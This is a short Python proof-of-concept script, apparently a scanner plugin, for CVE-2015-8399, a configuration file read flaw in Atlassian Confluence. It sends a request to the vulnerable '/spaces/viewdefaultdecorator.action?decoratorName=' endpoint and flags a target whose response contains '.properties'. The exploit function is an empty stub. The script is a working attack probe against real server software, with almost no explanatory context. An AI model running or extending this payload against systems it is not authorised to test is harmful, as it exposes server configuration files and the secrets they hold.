#!/usr/bin/env python
#-*- coding:utf-8 -*-
_type = 'FR'
"""
Atlassian Confluence config file read POC [CVE-2015-8399]

reference:
http://zone.wooyun.org/content/27104
http://www.cnnvd.org.cn/vulnerability/show/cv_id/2016010311
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8399

"""

import requests

def poc(url):
    try:
        if '://' not in url:
            url = 'http://' + url
        payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
        for each in payloads:
        	if '.properties' in requests.get(url=url + each).content:
        		return True
        return False
    except Exception, e:
        return False

def exp(url):
    pass
